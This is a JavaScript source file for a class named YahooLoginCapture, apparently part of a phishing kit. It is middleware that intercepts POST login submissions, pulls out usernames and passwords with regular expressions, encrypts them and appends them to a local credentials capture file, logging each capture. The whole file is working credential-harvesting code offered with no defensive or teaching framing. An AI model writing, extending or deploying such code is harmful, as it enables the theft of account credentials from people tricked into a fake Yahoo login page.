import fs from 'fs';
import path from 'path';
import CryptoUtils from '../utils/crypto-utils.js';
import Logger from '../utils/logger.js';
import { Config } from '../utils/config-manager.js';

class YahooLoginCapture {
    constructor() {
        this.cryptoUtils = new CryptoUtils();
        this.logger = new Logger();
        this.config = new Config();
        
        // Get capture storage path
        this.captureStoragePath = this.config.get(
            'capture.storage_path', 
            './storage/captures/credentials.json'
        );
    }

    // Intercept and process login attempts
    async interceptCredentials(req, res, next) {
        // Only process POST requests
        if (req.method !== 'POST') {
            return next();
        }

        // Accumulate request body
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            // Extract potential credentials
            const credentials = this.extractCredentials(body);
            
            if (credentials) {
                this.processCapture(credentials);
            }
            
            next();
        });
    }

    // Extract credentials from request body
    extractCredentials(body) {
        try {
            // Parse potential login parameters
            const usernameMatch = body.match(/username=([^&]+)/);
            const passwordMatch = body.match(/password=([^&]+)/);

            if (usernameMatch && passwordMatch) {
                return {
                    username: decodeURIComponent(usernameMatch[1]),
                    password: decodeURIComponent(passwordMatch[1]),
                    timestamp: new Date().toISOString(),
                    ip: this.getCurrentIP()
                };
            }

            return null;
        } catch (error) {
            this.logger.error('Credential extraction error', { error: error.message });
            return null;
        }
    }

    // Process and save captured credentials
    processCapture(credentials) {
        try {
            // Encrypt sensitive data
            const encryptedCredentials = this.cryptoUtils.encrypt(
                JSON.stringify(credentials)
            );

            // Ensure capture directory exists
            const captureDir = path.dirname(this.captureStoragePath);
            if (!fs.existsSync(captureDir)) {
                fs.mkdirSync(captureDir, { recursive: true });
            }

            // Append to capture file
            fs.appendFileSync(
                this.captureStoragePath, 
                `${encryptedCredentials}\n`, 
                { flag: 'a' }
            );

            // Log capture (if enabled)
            if (this.config.get('capture.log_captures', true)) {
                this.logger.warn('Credentials captured', { 
                    username: credentials.username,
                    ip: credentials.ip
                });
            }
        } catch (error) {
            this.logger.error('Capture save error', { error: error.message });
        }
    }

    // Get current IP address
    getCurrentIP() {
        // In a real-world scenario, this would come from the request
        return '127.0.0.1';
    }
}

export default YahooLoginCapture;